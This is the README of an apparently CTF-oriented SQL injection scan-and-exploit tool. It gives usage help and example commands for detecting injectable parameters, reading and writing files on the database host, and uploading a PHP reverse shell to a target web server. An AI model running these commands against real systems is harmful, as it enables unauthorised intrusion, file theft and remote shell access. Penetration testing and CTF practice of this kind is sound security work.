# sql_injection
A sql injection scan and exploit script

This script can be used if you can't use sqlmap, or for any restriction like wih some ctf.

It scan if a parameter is injectable , and also find how to exploit.

## Functions:

##### . Scan
##### . Found an injection
##### . Read a file from the DBMS
##### . Write a file into the DBMS
##### . Upload a reverse shell into the DBMS 


## Use

```
usage: sql_injection [-h] --data DATA [-m METHOD] [--file-dest REMOTEPAH]
                     [--file-write LOCALPATH] [--file-read PATHTOREAD]
                     [--upload-revshell REVSHELLPATH] [-H HEADER] [-c COOKIES]
                     -u URL -p PARAMETER [-l LEVEL] [-v VERBOSE]

A sql injection scan and exploit script

optional arguments:
  -h, --help            show this help message and exit
  --data DATA           Data string to be sent through POST/GET Like
                        "category=2&productId=1&productName=name"
  -m METHOD, --method METHOD
                        Htp method to use for injection, set to POST by
                        default
  --file-dest REMOTEPAH
                        Back-end DBMS absolute filepath to write to
  --file-write LOCALPATH
                        Write a local file on the back-end DBMS file system
  --file-read PATHTOREAD
                        Read a local file on the back-end DBMS file system
  --upload-revshell REVSHELLPATH
                        Upload a rev shell in the host. The script verify if
                        rev-shell is accessible from outside
  -H HEADER             One or multiple header for the request, separate with
                        a space Use like 'key1:value1 key2:value2'
  -c COOKIES, --cookies COOKIES
                        One or multiple cookies values for the request,
                        separate with a space Use like 'PHPSESSID=shuv7rnuv
                        UserToken=yes'
  -u URL, --url URL     The url to use for sqli
  -p PARAMETER, --parameter PARAMETER
                        The injectable parameter
  -l LEVEL, --level LEVEL
                        The level of the scan (l|h) "l" for little, and "h"
                        for huge
  -v VERBOSE, --verbose VERBOSE
                        Define verbose output. set to False by default
```

## Examples

#### Found an injection

```
$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId 
```

#### Read a file from the DBMS

```
$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId   --file-read "C:/Inetpub/wwwroot/view_product.php"
```

#### Write a file into the DBMS

```
$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId   --file-write /tmp/output.txt --file-dest "/InetPub/wwwroot/test.txt"
```

#### Upload a reverse shell into the DBMS 

```
$ sql_injection -u http://10.10.10.10:8080/complain/view.php -m GET -H "Agent:roughiz" --data "mod=admin&view=repod&id=plans" -p id  --cookie "PHPSESSID=9cc97jn016e2naklhp4rnj64j0"  --upload-revshell shell_cmd.php  -v 1
```

